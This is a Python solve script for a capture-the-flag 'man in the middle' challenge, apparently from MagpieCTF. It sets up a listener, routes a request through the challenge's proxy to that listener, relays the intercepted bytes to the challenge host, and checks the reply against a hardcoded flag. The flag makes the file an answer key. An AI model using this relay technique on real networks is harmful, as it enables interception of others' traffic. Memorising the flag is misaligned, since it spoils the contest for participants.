import requests, socket
from multiprocessing.pool import ThreadPool

def solve() -> bool:
    flag = "magpie{m4n_1n_th3_m1ddl3}"

    challenge_host = "net01.magpiectf.ca"
    challenge_port = 3665
    proxy_host = "http://net01.magpiectf.ca:1337"

    # The public IP of the computer running this script
    # The my_port port must be port forwarded in the router
    my_host = "http://xxx.xxx.xxx.xxx"
    my_port = 5665

    # Create intercept proxy thread
    pool = ThreadPool(processes=1)
    proxy = pool.apply_async(proxy_thread, (my_port, challenge_host, challenge_port))

    # Send request to intercept proxy
    r = requests.get(my_host + ":" + str(my_port), proxies={"http": proxy_host})

    proxy_data = proxy.get()

    pool.close()
    pool.join()

    return flag in proxy_data

def proxy_thread(my_port, challenge_host, challenge_port):
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serversocket.bind(('0.0.0.0', my_port))
    serversocket.listen(1)

    # Get data from proxy
    (clientsocket, address) = serversocket.accept()
    msg_byte = clientsocket.recv(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to challenge site
    s.connect((challenge_host, challenge_port))

    # Forward message to website
    s.send(msg_byte)
    data = s.recv(1024)

    # Close sockets
    serversocket.close()
    clientsocket.close()
    s.close()

    return data.decode()